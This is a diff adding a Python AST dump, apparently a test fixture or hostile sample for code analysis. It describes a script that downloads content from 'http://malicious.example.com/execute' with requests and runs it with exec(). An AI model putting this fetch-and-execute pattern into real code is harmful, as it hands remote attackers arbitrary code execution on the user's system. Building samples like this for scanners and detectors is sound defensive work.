@@ -1,0 +1,51 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='requests')]),
+        FunctionDef(
+            name='fetch_url',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='url')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='response', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='requests', ctx=Load()),
+                            attr='get',
+                            ctx=Load()),
+                        args=[
+                            Name(id='url', ctx=Load())],
+                        keywords=[])),
+                Return(
+                    value=Attribute(
+                        value=Name(id='response', ctx=Load()),
+                        attr='text',
+                        ctx=Load()))],
+            decorator_list=[]),
+        Assign(
+            targets=[
+                Name(id='malicious_url', ctx=Store())],
+            value=Constant(value='http://malicious.example.com/execute')),
+        Assign(
+            targets=[
+                Name(id='content', ctx=Store())],
+            value=Call(
+                func=Name(id='fetch_url', ctx=Load()),
+                args=[
+                    Name(id='malicious_url', ctx=Load())],
+                keywords=[])),
+        Expr(
+            value=Call(
+                func=Name(id='exec', ctx=Load()),
+                args=[
+                    Name(id='content', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
